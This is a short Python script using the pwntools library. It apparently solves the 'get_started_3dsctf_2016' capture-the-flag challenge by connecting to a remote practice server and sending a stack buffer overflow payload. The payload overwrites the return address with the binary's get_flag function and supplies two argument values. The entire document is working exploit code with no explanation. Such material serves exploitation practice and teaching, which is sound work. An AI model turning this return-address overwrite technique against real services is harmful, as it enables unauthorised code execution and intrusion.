from pwn import *

#p = process('./get_started_3dsctf_2016')
p = remote('node3.buuoj.cn', 26627)

elf = ELF('get_started_3dsctf_2016')

flag_address = elf.symbols['get_flag']
exit_address = elf.symbols['exit']

payload = b'a' * ( 0x38 ) + p32(flag_address) + p32(exit_address) + p32(814536271) + p32(425138641)

p.sendline(payload)

p.interactive()
